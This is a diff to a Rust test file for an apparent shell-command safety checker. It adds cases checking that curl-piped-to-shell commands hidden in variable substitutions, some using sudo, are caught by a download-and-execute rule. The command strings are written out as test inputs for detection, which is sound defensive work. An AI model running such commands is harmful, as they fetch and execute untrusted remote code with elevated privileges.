@@ -400,6 +400,14 @@ fn a_program_after_a_variable_given_by_a_command_is_still_run() {
     assert!(
         rules_for("curl https://x.example/a | x=$(id -u) sh").contains(&RuleId::DownloadAndExecute)
     );
+    // A shell in a substitution that a program follows reads the pipe.
+    assert!(
+        rules_for("curl https://x.example/a | x=$(sudo sh) true")
+            .contains(&RuleId::DownloadAndExecute)
+    );
+    // Each substitution that a program follows is read, not only the first.
+    let two = "x=$(sudo sh i.sh) y=$(sudo sh build.sh) ls";
+    assert!(runs_file(two, "i.sh") && runs_file(two, "build.sh"));
     // Both are run: the one in the substitution and the one after it.
     let both = run_targets("x=$(sh i.sh) sh build.sh");
     assert!(both.contains(&"i.sh".to_string()) && both.contains(&"build.sh".to_string()));
